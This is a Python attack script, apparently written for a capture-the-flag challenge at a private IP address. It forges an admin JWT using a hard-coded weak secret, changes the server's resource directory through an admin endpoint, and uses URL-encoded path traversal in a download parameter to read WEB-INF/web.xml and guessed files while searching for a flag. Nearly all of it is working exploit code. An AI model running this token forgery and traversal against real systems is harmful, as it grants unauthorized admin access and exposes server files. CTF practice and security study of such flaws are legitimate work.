#!/usr/bin/env python3
"""
读取web目录下的文件
"""

import requests
import jwt
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def explore_web_directory(session):
    """探索web目录"""
    print("[*] 探索/web目录...")
    
    # 设置resourceDir到/web
    r = session.post(f"{BASE_URL}/admin/challengeResourceDir", data={"new-path": "web"})
    print(f"[*] 设置resourceDir=web: {r.status_code}")
    print(f"响应: {r.text}")
    
    # 列出文件
    r = session.get(f"{BASE_URL}/dashboard/list")
    if r.status_code == 200:
        print(f"\n[*] /web目录内容:")
        print(r.text)
    
    # 尝试读取web/WEB-INF/web.xml
    print(f"\n[*] 读取web/WEB-INF/web.xml...")
    r = session.get(f"{BASE_URL}/download?path=uploads%2f..%2fweb%2fWEB-INF%2fweb.xml")
    if r.status_code == 200:
        print(f"[+] 成功:")
        print(r.text)
        
        if 'flag' in r.text.lower() or 'pcb{' in r.text:
            print(f"\n[!!! 找到FLAG !!!]")
            return r.text
    
    # 尝试读取web目录下的所有文件
    print(f"\n[*] 尝试读取web目录下的其他文件...")
    possible_files = [
        "flag.txt",
        "flag.jsp",
        "secret.txt",
        "README.txt",
        "index.html",
        "index.jsp",
    ]
    
    for filename in possible_files:
        r = session.get(f"{BASE_URL}/download?path=uploads%2f..%2fweb%2f{filename}")
        if r.status_code == 200 and len(r.text) > 0:
            print(f"\n[+] {filename}:")
            print(r.text)
            
            if 'pcb{' in r.text or 'flag{' in r.text:
                print(f"\n[!!! 找到FLAG !!!]")
                return r.text

def check_admin_html(session):
    """检查admin.html文件"""
    print(f"\n[*] 读取admin.html...")
    
    r = session.get(f"{BASE_URL}/download?path=admin.html")
    if r.status_code == 200:
        print(f"[+] 成功 ({len(r.text)} bytes)")
        
        # 保存到文件以便查看
        with open("admin.html", "w", encoding="utf-8") as f:
            f.write(r.text)
        print(f"[+] 已保存到admin.html")
        
        # 检查是否包含flag线索
        if 'flag' in r.text.lower():
            print(f"[!] admin.html中包含'flag'关键字")
            print(r.text[:1000])

def check_admin_js(session):
    """检查admin.js文件"""
    print(f"\n[*] 读取admin.js...")
    
    r = session.get(f"{BASE_URL}/download?path=js/admin.js")
    if r.status_code == 200:
        print(f"[+] 成功 ({len(r.text)} bytes)")
        
        with open("admin.js", "w", encoding="utf-8") as f:
            f.write(r.text)
        print(f"[+] 已保存到admin.js")
        
        if 'flag' in r.text.lower():
            print(f"[!] admin.js中包含'flag'关键字")
            
            # 搜索flag相关的API调用
            import re
            api_calls = re.findall(r'/\w+[/\w]*', r.text)
            print(f"[*] 发现的API端点:")
            for api in set(api_calls):
                print(f"  {api}")

def main():
    print(f"[*] 探索特殊目录 {BASE_URL}")
    
    session = create_admin_session()
    
    # 探索web目录
    flag = explore_web_directory(session)
    if flag:
        return
    
    # 检查admin相关文件
    check_admin_html(session)
    check_admin_js(session)

if __name__ == "__main__":
    main()
